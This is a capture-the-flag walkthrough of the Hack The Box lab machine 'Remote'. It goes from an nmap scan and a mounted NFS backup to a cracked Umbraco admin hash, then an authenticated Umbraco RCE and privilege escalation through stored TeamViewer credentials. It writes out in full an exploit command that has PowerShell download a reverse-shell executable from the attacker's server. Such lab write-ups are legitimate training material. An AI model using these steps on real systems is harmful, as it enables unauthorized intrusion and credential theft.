# Remote
### 10.10.10.180

![nmap](../../images/writeups/remote/header.png)

### Port Scanning and general enumeration (Nmap, Umbraco)
* Reading/Resources
  * [Nmap manual](https://nmap.org/book/man.html)
  * [Umbraco](https://umbraco.com/)
 
**nmap [-sC](https://nmap.org/book/man-nse.html) [-sV](https://nmap.org/book/man-version-detection.html) [-oN](https://nmap.org/book/man-output.html) nmap/initial [-T4](https://nmap.org/book/man-performance.html) 10.10.10.180**

![nmap](../../images/writeups/remote/nmap.png)

Interesting. FTP, Webserver and maybe some nfs shares we can mount?

Let's take a look at the site

![nmap](../../images/writeups/remote/site1.png)

Looks like some sort of blog.. 'Umbraco'?

![nmap](../../images/writeups/remote/site2.png)

![nmap](../../images/writeups/remote/login.png)

So we've found a login form. Nice. Default creds didn't work, so we'll come back to this.

Let's see if there's anything to mount

![nmap](../../images/writeups/remote/showmount.png)

Interesting! Let's mount it

**sudo mount -t nfs 10.10.10.180:/site_backups /path/to/where/you/want/to/save/it**

Full site backup!

Since we know the backend is **Umbraco**, we can find the version in the `Web.config` file and credentials in the `App_Data/Umbraco.sdf` file.

Version:

![nmap](../../images/writeups/remote/version.png)

To get the credentials we can run `strings` on the `Umbraco.sdf` file, redirect it to a file and run `head` on that file

![nmap](../../images/writeups/remote/creds.png)

So the admin password is a `SHA1` hash. Let's crack it and log in using `Admin@htb.local:cracked-password` in the forms we found earlier.

### Access (Umbraco RCE, msfvenom)
* Reading/Resources
  * [Umbraco RCE](https://github.com/noraj/Umbraco-RCE)
  * [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
  * [Metasploit](https://www.metasploit.com/)
  

So now that we're authenticated we have a little more room to play with things. I found this [Umbraco RCE](https://github.com/noraj/Umbraco-RCE) script that should be perfect

![nmap](../../images/writeups/remote/rce.png)

Nice! So now we have remote code execution. Let's get a proper shell

![nmap](../../images/writeups/remote/msfvenom.png)

Stand up a simple [python http server](https://docs.python.org/3/library/http.server.html) and use the exploit to transfer our executable to the machine

`python3 exploit.py -u admin@htb.local -p password -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command Invoke-WebRequest -Uri http://10.10.14.22:8000/rev.exe -OutFile C:/Users/Public/rev.exe`

Now that our shell is on the box, let's fire up a `metasploit` listener

![nmap](../../images/writeups/remote/listener.png)

Trigger the shell and off we go

### Privesc (winPEAS, evil-winrm)
* Reading/Resources
  * [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
  * [evil-winrm](https://github.com/Hackplayers/evil-winrm)

Now that we're on the box, let's do some enumeration. I like [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Upload and run it

![nmap](../../images/writeups/remote/peasupload.png)

![nmap](../../images/writeups/remote/peas.png)

Interesting. Teamviewer7 also has a [metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md). Let's see what that has for us

Background your meterpreter session and

![nmap](../../images/writeups/remote/teamviewersearch.png)

![nmap](../../images/writeups/remote/teamviewerpassword.png)

Could that be the **Admin** password? Let's check using [evil-winrm](https://github.com/Hackplayers/evil-winrm)

![nmap](../../images/writeups/remote/admin.png)

![nmap](../../images/writeups/remote/userflag.png)

![nmap](../../images/writeups/remote/rootflag.png)
